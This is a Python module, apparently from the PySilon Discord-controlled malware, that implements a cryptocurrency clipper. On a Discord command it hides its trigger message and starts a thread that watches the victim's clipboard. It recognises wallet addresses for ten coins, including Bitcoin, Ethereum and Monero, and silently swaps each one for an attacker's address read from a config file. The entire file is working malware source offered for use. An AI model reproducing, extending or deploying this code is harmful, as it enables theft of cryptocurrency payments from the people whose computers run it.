import pyperclip
import re
import os
import json
import threading

script_dir = os.path.dirname(os.path.abspath(__file__))
status_file_path = os.path.join(script_dir, "clipper_status.json")

def load_clipper_status():
    if not os.path.exists(status_file_path):
        with open(status_file_path, "w") as file:
            json.dump({"status": "off"}, file)
    with open(status_file_path, "r") as file:
        return json.load(file)

def save_clipper_status(status):
    if not os.path.exists(status_file_path):
        with open(status_file_path, "w") as file:
            json.dump({"status": "off"}, file)
    with open(status_file_path, "w") as file:
        json.dump({"status": status}, file)

def match(addresses):
    clipboard = str(pyperclip.paste())
    btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
    eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
    doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
    ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
    xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
    bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
    dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
    trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
    xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
    xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)
    for currency, address in addresses.items():
        if eval(f'{currency.lower()}_match'):
            if address and address != clipboard:
                pyperclip.copy(address)
            break

@client.command(name="clipper")
async def crypto_clipper(ctx, option):
    global clipper_stop, clipper_thread, clipper_thread_stop

    clipper_status = load_clipper_status()

    if option == "start":
        await ctx.message.delete()
        if clipper_status["status"] == "off":
            clipper_stop = False
            clipper_thread_stop = False
            script_dir = os.path.dirname(os.path.abspath(__file__))
            config_path = os.path.join(script_dir, 'crypto_clipper.json')
            with open(config_path) as f:
                addresses = json.load(f)
            
            def wait_for_paste():
                while not clipper_thread_stop:
                    while not clipper_stop:
                        pyperclip.waitForNewPaste()
                        match(addresses)

            clipper_thread = threading.Thread(target=wait_for_paste)
            clipper_thread.start()
            embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)

            save_clipper_status("on")

        else:
            embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    elif option == "stop":
        if clipper_status["status"] == "on":
            clipper_thread_stop = True
            embed = discord.Embed(title="🔴 Crypto Clipper stopped!",description=f'```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
            clipper_stop = True

            save_clipper_status("off")

        else:
            embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="🔴 Hold on!",description=f'```Syntax: .clipper <start/stop>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        return await ctx.send(embed=embed)